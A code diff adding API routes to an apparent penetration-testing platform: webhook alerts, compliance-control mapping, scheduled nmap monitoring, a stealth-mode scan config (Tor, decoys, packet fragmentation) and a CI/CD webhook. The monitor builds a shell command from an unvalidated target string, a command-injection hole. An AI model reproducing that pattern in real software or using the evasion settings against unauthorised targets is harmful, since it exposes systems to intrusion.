+            webhook_url,
+            data=req_data,
+            headers={"Content-Type": "application/json", "User-Agent": "PentSuite/1.0"},
+        )
+        with _ureq.urlopen(req, timeout=10) as resp:
+            return jsonify({"status": "ok", "http_code": resp.status})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/projects/<project_id>/notify-findings", methods=["POST"])
+@api_login_required
+def notify_new_findings(project_id):
+    """Push new critical/high findings to all configured webhooks."""
+    import urllib.request as _ureq
+    project = load_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+
+    data = request.json or {}
+    webhook_url = data.get("webhook_url") or project.get("webhook_url", "")
+    if not webhook_url:
+        return jsonify({"skipped": "no webhook configured"}), 200
+
+    new_findings = [f for f in project.get("findings", [])
+                    if f.get("severity") in ("critical", "high") and not f.get("notified")]
+
+    sent = 0
+    for f in new_findings[:10]:
+        payload = json.dumps({
+            "text": f"🚨 [{f.get('severity','?').upper()}] {f.get('title','')}",
+            "project": project.get("name", project_id),
+            "target": project.get("target", ""),
+            "description": f.get("description", "")[:200],
+            "cve": f.get("cve", ""),
+        }).encode("utf-8")
+        try:
+            req = _ureq.Request(webhook_url, data=payload,
+                                headers={"Content-Type": "application/json"})
+            _ureq.urlopen(req, timeout=8)
+            f["notified"] = True
+            sent += 1
+        except Exception:
+            pass
+
+    if sent > 0:
+        save_project(project)
+
+    return jsonify({"sent": sent, "total_new": len(new_findings)})
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TIER 3 — H3: Compliance report (OWASP, PCI-DSS, ISO 27001, NIST CSF)
+# ═══════════════════════════════════════════════════════════════════════════
+
+_COMPLIANCE_CONTROLS = {
+    "OWASP Top 10 2021": [
+        "A01:2021 — Broken Access Control",
+        "A02:2021 — Cryptographic Failures",
+        "A03:2021 — Injection",
+        "A04:2021 — Insecure Design",
+        "A05:2021 — Security Misconfiguration",
+        "A06:2021 — Vulnerable and Outdated Components",
+        "A07:2021 — Identification and Authentication Failures",
+        "A08:2021 — Software and Data Integrity Failures",
+        "A09:2021 — Security Logging and Monitoring Failures",
+        "A10:2021 — Server-Side Request Forgery (SSRF)",
+    ],
+    "PCI-DSS 4.0": [
+        "Req 1 — Install and maintain network security controls",
+        "Req 2 — Apply secure configurations",
+        "Req 3 — Protect stored account data",
+        "Req 4 — Protect cardholder data in transit (TLS)",
+        "Req 5 — Protect against malicious software",
+        "Req 6 — Develop and maintain secure systems (patching)",
+        "Req 7 — Restrict access by business need",
+        "Req 8 — Identify users and authenticate access",
+        "Req 10 — Log and monitor all access",
+        "Req 11 — Test security of systems regularly",
+    ],
+    "ISO 27001:2022": [
+        "A.5 — Organizational Controls",
+        "A.8.8 — Management of technical vulnerabilities",
+        "A.8.9 — Configuration management",
+        "A.8.20 — Networks security",
+        "A.8.23 — Web filtering",
+        "A.8.25 — Secure development life cycle",
+        "A.8.28 — Secure coding",
+        "A.8.29 — Security testing in development and acceptance",
+    ],
+    "NIST CSF 2.0": [
+        "ID.RA — Risk Assessment",
+        "PR.AC — Identity Management and Access Control",
+        "PR.DS — Data Security",
+        "PR.IP — Information Protection Processes",
+        "DE.CM — Security Continuous Monitoring",
+        "RS.RP — Response Planning",
+    ],
+}
+
+_FINDING_TO_CONTROLS = {
+    r'sql.inject|sqli':
+        {"OWASP Top 10 2021": ["A03:2021 — Injection"],
+         "PCI-DSS 4.0": ["Req 6 — Develop and maintain secure systems (patching)"],
+         "ISO 27001:2022": ["A.8.28 — Secure coding"],
+         "NIST CSF 2.0": ["ID.RA — Risk Assessment"]},
+    r'xss|cross.site':
+        {"OWASP Top 10 2021": ["A03:2021 — Injection"],
+         "PCI-DSS 4.0": ["Req 6 — Develop and maintain secure systems (patching)"]},
+    r'ssrf':
+        {"OWASP Top 10 2021": ["A10:2021 — Server-Side Request Forgery (SSRF)"],
+         "PCI-DSS 4.0": ["Req 1 — Install and maintain network security controls"]},
+    r'auth.*bypass|jwt|oauth|token':
+        {"OWASP Top 10 2021": ["A07:2021 — Identification and Authentication Failures"],
+         "PCI-DSS 4.0": ["Req 8 — Identify users and authenticate access"],
+         "ISO 27001:2022": ["A.8.5 — Secure authentication"]},
+    r'ssl|tls|heartbleed|cipher':
+        {"OWASP Top 10 2021": ["A02:2021 — Cryptographic Failures"],
+         "PCI-DSS 4.0": ["Req 4 — Protect cardholder data in transit (TLS)"],
+         "ISO 27001:2022": ["A.8.20 — Networks security"]},
+    r'patch|cve-|ms17|ms08|eternalblue|bluekeep':
+        {"OWASP Top 10 2021": ["A06:2021 — Vulnerable and Outdated Components"],
+         "PCI-DSS 4.0": ["Req 6 — Develop and maintain secure systems (patching)",
+                         "Req 11 — Test security of systems regularly"],
+         "NIST CSF 2.0": ["ID.RA — Risk Assessment", "DE.CM — Security Continuous Monitoring"]},
+    r'default.*cred|weak.*pass|brute':
+        {"OWASP Top 10 2021": ["A07:2021 — Identification and Authentication Failures"],
+         "PCI-DSS 4.0": ["Req 8 — Identify users and authenticate access"],
+         "ISO 27001:2022": ["A.5 — Organizational Controls"]},
+    r'misconfigur|exposed.*port|open.*service':
+        {"OWASP Top 10 2021": ["A05:2021 — Security Misconfiguration"],
+         "PCI-DSS 4.0": ["Req 2 — Apply secure configurations"],
+         "ISO 27001:2022": ["A.8.9 — Configuration management"]},
+    r'privesc|privilege|root|admin':
+        {"OWASP Top 10 2021": ["A01:2021 — Broken Access Control"],
+         "PCI-DSS 4.0": ["Req 7 — Restrict access by business need"],
+         "ISO 27001:2022": ["A.5 — Organizational Controls"],
+         "NIST CSF 2.0": ["PR.AC — Identity Management and Access Control"]},
+    r's3.*bucket|cloud.*misconfigur|terraform':
+        {"OWASP Top 10 2021": ["A05:2021 — Security Misconfiguration"],
+         "PCI-DSS 4.0": ["Req 1 — Install and maintain network security controls",
+                         "Req 3 — Protect stored account data"]},
+}
+
+
+def _map_finding_compliance(finding):
+    """Map a finding to relevant compliance controls."""
+    text = f"{finding.get('title', '')} {finding.get('description', '')}".lower()
+    mapped = {}
+    for pattern, controls in _FINDING_TO_CONTROLS.items():
+        if re.search(pattern, text, re.IGNORECASE):
+            for fw, items in controls.items():
+                if fw not in mapped:
+                    mapped[fw] = []
+                for item in items:
+                    if item not in mapped[fw]:
+                        mapped[fw].append(item)
+    return mapped
+
+
+@app.route("/api/projects/<project_id>/report/compliance")
+@api_login_required
+def export_compliance_report(project_id):
+    """Generate a compliance mapping report (OWASP/PCI/ISO/NIST)."""
+    project = load_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+
+    findings = project.get("findings", [])
+    framework = request.args.get("framework", "all")
+
+    # Build compliance matrix
+    compliance_matrix = {}
+    for fw, controls in _COMPLIANCE_CONTROLS.items():
+        if framework != "all" and framework.lower() not in fw.lower():
+            continue
+        compliance_matrix[fw] = {}
+        for control in controls:
+            matching = []
+            for f in findings:
+                mapped = _map_finding_compliance(f)
+                if fw in mapped and control in mapped[fw]:
+                    matching.append({
+                        "id": f.get("id", ""),
+                        "title": f.get("title", ""),
+                        "severity": f.get("severity", ""),
+                    })
+            compliance_matrix[fw][control] = {
+                "status": "FAIL" if matching else "PASS",
+                "findings": matching,
+                "count": len(matching),
+            }
+
+    # Summary stats
+    summary = {}
+    for fw, controls in compliance_matrix.items():
+        fail_count = sum(1 for c in controls.values() if c["status"] == "FAIL")
+        total = len(controls)
+        summary[fw] = {
+            "pass": total - fail_count,
+            "fail": fail_count,
+            "total": total,
+            "compliance_pct": round((total - fail_count) / total * 100, 1) if total else 100,
+        }
+
+    return jsonify({
+        "project": project.get("name", ""),
+        "target": project.get("target", ""),
+        "scan_date": project.get("updated_at", ""),
+        "summary": summary,
+        "matrix": compliance_matrix,
+        "total_findings": len(findings),
+    })
+
+
+@app.route("/api/projects/<project_id>/findings/<finding_id>/compliance")
+@api_login_required
+def get_finding_compliance(project_id, finding_id):
+    """Get compliance controls relevant to a specific finding."""
+    project = load_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+    finding = next((f for f in project.get("findings", []) if f.get("id") == finding_id), None)
+    if not finding:
+        return jsonify({"error": "Finding not found"}), 404
+    return jsonify({"compliance": _map_finding_compliance(finding)})
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TIER 3 — H4: Continuous monitoring (schedule scans, CVE alerting)
+# ═══════════════════════════════════════════════════════════════════════════
+MONITORS_FILE = DATA_DIR / "monitors.json"
+
+def _load_monitors():
+    if MONITORS_FILE.exists():
+        with open(MONITORS_FILE, encoding="utf-8") as f:
+            return json.load(f)
+    return {}
+
+def _save_monitors(monitors):
+    with open(MONITORS_FILE, "w", encoding="utf-8") as f:
+        json.dump(monitors, f, indent=2)
+
+
+@app.route("/api/monitors", methods=["GET"])
+@api_login_required
+def list_monitors():
+    return jsonify(list(_load_monitors().values()))
+
+
+@app.route("/api/monitors", methods=["POST"])
+@api_login_required
+def create_monitor():
+    """Create a continuous monitoring job for a target."""
+    data = request.json or {}
+    monitors = _load_monitors()
+    mon_id = str(uuid.uuid4())
+    monitor = {
+        "id": mon_id,
+        "name": data.get("name", "Monitor"),
+        "target": data.get("target", ""),
+        "project_id": data.get("project_id", ""),
+        "interval_hours": int(data.get("interval_hours", 24)),
+        "enabled": True,
+        "mode": data.get("mode", "light"),  # light / full
+        "webhook_url": data.get("webhook_url", ""),
+        "cve_alert": data.get("cve_alert", True),
+        "last_run": None,
+        "next_run": datetime.utcnow().isoformat(),
+        "created_at": datetime.utcnow().isoformat(),
+        "run_count": 0,
+        "alert_count": 0,
+    }
+    monitors[mon_id] = monitor
+    _save_monitors(monitors)
+    return jsonify(monitor), 201
+
+
+@app.route("/api/monitors/<mon_id>", methods=["GET", "PUT", "DELETE"])
+@api_login_required
+def manage_monitor(mon_id):
+    monitors = _load_monitors()
+    if mon_id not in monitors:
+        return jsonify({"error": "Not found"}), 404
+    if request.method == "DELETE":
+        del monitors[mon_id]
+        _save_monitors(monitors)
+        return jsonify({"deleted": True})
+    if request.method == "PUT":
+        data = request.json or {}
+        monitors[mon_id].update({k: v for k, v in data.items()
+                                  if k in ("name", "interval_hours", "enabled", "mode",
+                                           "webhook_url", "cve_alert")})
+        _save_monitors(monitors)
+    return jsonify(monitors[mon_id])
+
+
+@app.route("/api/monitors/<mon_id>/run", methods=["POST"])
+@api_login_required
+def run_monitor_now(mon_id):
+    """Trigger an immediate monitoring scan for a monitor."""
+    monitors = _load_monitors()
+    if mon_id not in monitors:
+        return jsonify({"error": "Not found"}), 404
+    monitor = monitors[mon_id]
+    target = monitor.get("target", "")
+    project_id = monitor.get("project_id", "")
+    if not target or not project_id:
+        return jsonify({"error": "Monitor missing target or project_id"}), 400
+
+    # Run a lightweight scan in background
+    def _light_scan():
+        import subprocess
+        result = subprocess.run(
+            f"nmap -sV -T4 --open -p 22,80,443,445,8080,8443,3389,21,25 {target} 2>/dev/null",
+            shell=True, capture_output=True, text=True, timeout=120
+        )
+        out = result.stdout
+        # Parse for new open ports / version changes
+        new_ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)', out)
+        project = load_project(project_id)
+        if not project:
+            return
+        existing_ports = {str(p.get("port")): p.get("version", "") for p in project.get("ports", [])}
+        alerts = []
+        for port, svc, ver in new_ports:
+            if port not in existing_ports:
+                alerts.append(f"NEW PORT: {port}/tcp {svc} {ver}")
+            elif ver and ver.strip() != existing_ports.get(port, "").strip():
+                alerts.append(f"VERSION CHANGE: {port}/tcp {svc} {ver} (was: {existing_ports[port]})")
+        if alerts:
+            monitor["alert_count"] += int(len(alerts))
+            _save_findings_direct = [{
+                "title": f"Monitor Alert: {a}",
+                "severity": "medium",
+                "description": f"Cambio detectado en {target}:\n{a}\n\nScan output:\n{out[:300]}",
+                "cve": "",
+            } for a in alerts]
+            # Save to project
+            for finding in _save_findings_direct:
+                finding["id"] = str(uuid.uuid4())
+                finding["created_at"] = datetime.utcnow().isoformat()
+                project.setdefault("findings", []).append(finding)
+            save_project(project)
+            # Send webhook
+            wh = monitor.get("webhook_url", "")
+            if wh and alerts:
+                try:
+                    import urllib.request as _ureq
+                    payload = json.dumps({
+                        "text": f"🔔 Monitor Alert: {len(alerts)} change(s) on {target}",
+                        "alerts": alerts,
+                        "project_id": project_id,
+                    }).encode()
+                    _ureq.urlopen(_ureq.Request(wh, data=payload,
+                                                headers={"Content-Type": "application/json"}), timeout=8)
+                except Exception:
+                    pass
+        monitor["last_run"] = datetime.utcnow().isoformat()
+        monitor["run_count"] = monitor.get("run_count", 0) + 1
+        monitor["next_run"] = (datetime.utcnow() + timedelta(hours=monitor.get("interval_hours", 24))).isoformat()
+        _save_monitors(monitors)
+
+    import threading as _thr
+    _thr.Thread(target=_light_scan, daemon=True).start()
+    return jsonify({"status": "running", "monitor": mon_id})
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TIER 3 — H5: Stealth mode config endpoint
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.route("/api/projects/<project_id>/autopilot/stealth", methods=["GET", "PUT"])
+@api_login_required
+def autopilot_stealth_config(project_id):
+    """Configure stealth mode options for the autopilot engine."""
+    project = load_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+    if request.method == "PUT":
+        data = request.json or {}
+        project.setdefault("stealth_config", {}).update({
+            k: v for k, v in data.items()
+            if k in ("enabled", "timing_min_ms", "timing_max_ms",
+                     "use_tor", "decoy_scan", "fragment_packets",
+                     "random_user_agents", "rotate_source_port")
+        })
+        save_project(project)
+    return jsonify(project.get("stealth_config", {
+        "enabled": False,
+        "timing_min_ms": 100,
+        "timing_max_ms": 3000,
+        "use_tor": False,
+        "decoy_scan": False,
+        "fragment_packets": False,
+        "random_user_agents": True,
+        "rotate_source_port": False,
+    }))
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TIER 3 — H2: GitHub Actions / GitLab CI webhook receiver
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.route("/api/cicd/webhook", methods=["POST"])
+def cicd_webhook():
+    """Receive CI/CD push events and auto-trigger a scan."""
+    import hmac as _hmac
+    import hashlib as _hashlib
+    data = request.json or {}
+    event_type = request.headers.get("X-GitHub-Event") or request.headers.get("X-Gitlab-Event", "push")
+    repo = data.get("repository", {}).get("full_name", "unknown")
+    ref = data.get("ref", "refs/heads/main")
+    target_url = (data.get("repository", {}).get("homepage") or
+                  data.get("repository", {}).get("url", ""))
+
+    # Validate GitHub signature if secret configured
+    webhook_secret = os.environ.get("CICD_WEBHOOK_SECRET", "")
+    if webhook_secret:
+        sig = request.headers.get("X-Hub-Signature-256", "")
+        expected = "sha256=" + _hmac.new(webhook_secret.encode(), request.data, _hashlib.sha256).hexdigest()
+        if not _hmac.compare_digest(sig, expected):
+            return jsonify({"error": "Invalid signature"}), 401
+
+    if event_type not in ("push", "Push Hook", "merge_request") or "main" not in ref and "master" not in ref:
+        return jsonify({"skipped": f"event {event_type} on {ref}"}), 200
+
+    # Create a new project for this CI/CD scan
+    new_project_data = {
+        "name": f"CI/CD: {repo} [{ref.split('/')[-1]}]",
+        "target": re.sub(r'https?://', '', target_url).rstrip("/") if target_url else repo,
+        "type": "web",
+        "created_via": "cicd_webhook",
+        "repo": repo,
+        "ref": ref,
+    }
+
+    # Use existing create_project logic
+    projects = load_projects()
+    proj_id = str(uuid.uuid4())
+    new_project_data["id"] = proj_id
+    new_project_data["created_at"] = datetime.utcnow().isoformat()
+    new_project_data["findings"] = []
+    projects[proj_id] = new_project_data
+    save_projects(projects)
+
+    return jsonify({
+        "status": "queued",
+        "project_id": proj_id,
+        "target": new_project_data["target"],
+        "sarif_url": f"/api/projects/{proj_id}/report/sarif",
+        "compliance_url": f"/api/projects/{proj_id}/report/compliance",
+    }), 201
 
 
 if __name__ == "__main__":
